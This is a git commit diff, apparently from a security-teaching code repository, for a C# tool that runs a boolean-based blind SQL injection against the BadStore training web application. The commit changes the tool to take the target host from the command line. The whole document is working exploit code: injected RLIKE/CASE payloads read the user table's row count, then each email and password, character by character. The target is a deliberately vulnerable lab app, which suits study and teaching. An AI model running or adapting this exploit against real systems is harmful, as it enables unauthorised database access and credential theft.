62b3f56f918f89dd2cca9b6465e6650b37043b8c
Brandon Perry <bperry.volatile@gmail.com>
2015-06-03 20:48:27 -0500

    make dynamic

--- ch2_sqli_blind/Program.cs
+++ ch2_sqli_blind/Program.cs
@@ -10,19 +10,12 @@ namespace ch2_sqli_blind
 	{
 		public static void Main (string[] args)
 		{
-			System.Net.ServicePointManager.ServerCertificateValidationCallback +=
-				delegate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certificate,
-					System.Security.Cryptography.X509Certificates.X509Chain chain,
-					System.Net.Security.SslPolicyErrors sslPolicyErrors)
-			{
-				return true; //Verify any cert regardless of errors in the cert chain
-			};
-
+			string host = args [0];
 			int countLength = 0;
 			for (;;countLength++) {
 				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM badstoredb.userdb)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";
 
-				string response = MakeRequest (getCountLength);
+				string response = MakeRequest (host, getCountLength);
 
 				if (response.Contains ("parentheses not balanced"))
 					break;
@@ -32,7 +25,7 @@ namespace ch2_sqli_blind
 			for (int i = 1; i <= countLength; i++) {
 				for (int c = 48; c <= 58; c++) { 
 					string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM badstoredb.userdb)," + i + ",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'LeSo'='LeSo";
-					string response = MakeRequest (getCount);
+					string response = MakeRequest (host, getCount);
 
 					if (response.Contains ("parentheses not balanced")) {
 						countBytes.Add ((byte)c);
@@ -48,23 +41,23 @@ namespace ch2_sqli_blind
 			for (int row = 0; row < count; row++) {
 				foreach (string column in new string[] { "email", "passwd" }) {
 					Console.Write("Getting length of query value... ");
-					int valLength = GetLength (row, column);
+					int valLength = GetLength (host, row, column);
 					Console.WriteLine (valLength);
 
 					Console.Write ("Getting value... ");
-					string value = GetValue (row, column, valLength);
+					string value = GetValue (host, row, column, valLength);
 
 					Console.WriteLine (value);
 				}
 			}
 		}
 
-		private static int GetLength(int row, string column) {
+		private static int GetLength(string host, int row, string column) {
 			int countLength = 0;
 			for (;; countLength++) {
 				string getCountLength = "fdsa' RLIKE (SELECT (CASE WHEN ((SELECT LENGTH(IFNULL(CAST(CHAR_LENGTH("+column+") AS CHAR),0x20)) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1)>"+countLength+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
 
-				string response = MakeRequest (getCountLength);
+				string response = MakeRequest (host, getCountLength);
 
 				if (response.Contains ("parentheses not balanced"))
 					break;
@@ -74,7 +67,7 @@ namespace ch2_sqli_blind
 			for (int i = 1; i <= countLength; i++) {
 				for (int c = 48; c <= 58; c++) {
 					string getLength = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM badstoredb.userdb ORDER BY email LIMIT " + row + ",1)," + i + ",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
-					string response = MakeRequest (getLength);
+					string response = MakeRequest (host, getLength);
 
 					if (response.Contains ("parentheses not balanced")) { 
 						countBytes.Add ((byte)c);
@@ -86,12 +79,12 @@ namespace ch2_sqli_blind
 			return int.Parse (Encoding.ASCII.GetString (countBytes.ToArray ()));
 		}
 
-		private static string GetValue(int row, string column, int length) {
+		private static string GetValue(string host, int row, string column, int length) {
 			List<byte> valBytes = new List<byte> ();
 			for (int i = 1; i <= length; i++) {
 				for (int c = 32; c <= 126; c++) {
 					string getChar = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST("+column+" AS CHAR),0x20) FROM badstoredb.userdb ORDER BY email LIMIT "+row+",1),"+i+",1))>"+c+") THEN 0x66647361 ELSE 0x28 END)) AND 'YIye'='YIye";
-					string response = MakeRequest (getChar);
+					string response = MakeRequest (host, getChar);
 
 					if (response.Contains ("parentheses not balanced")) {
 						valBytes.Add ((byte)c);
@@ -102,9 +95,8 @@ namespace ch2_sqli_blind
 			return Encoding.ASCII.GetString(valBytes.ToArray());
 		}
 
-		private static string MakeRequest(string url) {
-			HttpWebRequest request = (HttpWebRequest)WebRequest.Create ("http://192.168.1.11/cgi-bin/badstore.cgi?action=search&searchquery="+url);
-			//request.Proxy = new WebProxy ("127.0.0.1", 8080);
+		private static string MakeRequest(string host, string payload) {
+			HttpWebRequest request = (HttpWebRequest)WebRequest.Create ("http://"+host+"/cgi-bin/badstore.cgi?action=search&searchquery="+Uri.EscapeUriString(payload));
 
 			string response = string.Empty;
 			using (StreamReader reader = new StreamReader (request.GetResponse ().GetResponseStream ()))
